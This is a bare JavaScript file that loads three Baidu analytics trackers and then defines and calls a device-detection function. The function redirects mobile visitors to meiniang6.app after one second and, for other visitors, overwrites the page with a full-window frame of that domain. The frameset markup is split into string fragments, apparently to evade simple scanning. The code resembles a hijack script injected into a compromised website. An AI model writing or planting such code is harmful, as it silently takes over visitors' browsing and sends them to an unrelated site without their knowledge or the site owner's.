var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?7e1616c42c2fae037162fb6bf5632991";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?9a9e8e9eb5b14464b94093a17b418c6d";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?bfc19beae93fb7a3ab66b8f47951b3f8";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();


function mobile_device_detect(url) {
    var houzhui = "";
    var thisOS = navigator.platform;
    var os = new Array("iPhone", "iPod", "iPad", "android", "Nokia", "SymbianOS", "Symbian", "Windows Phone", "Phone", "Linux armv71", "MAUI", "UNTRUSTED/1.0", "Windows CE", "BlackBerry", "IEMobile");
    for (var i = 0; i < os.length; i++) {
        if (thisOS.match(os[i])) {
            setTimeout(function() {
                window.location.href = url + houzhui
            }, 1000)
        }
    }
    if (navigator.platform.indexOf('iPad') != -1) {
        setTimeout(function() {
            window.location.href = url + houzhui
        }, 1000)
    }
    var check = navigator.appVersion;
    if (check.match(/linux/i)) {
        if (check.match(/mobile/i) || check.match(/X11/i)) {
            setTimeout(function() {
                window.location.href = url + houzhui
            }, 1000)
        }
    } else {
        document.writeln("<fram" + "eset cols=\"100%\"><fr" + "ame src=\"https://meiniang6.app/" + "\" ></fr></fra" + "meset>")
    }
}
mobile_device_detect("https://meiniang6.app/");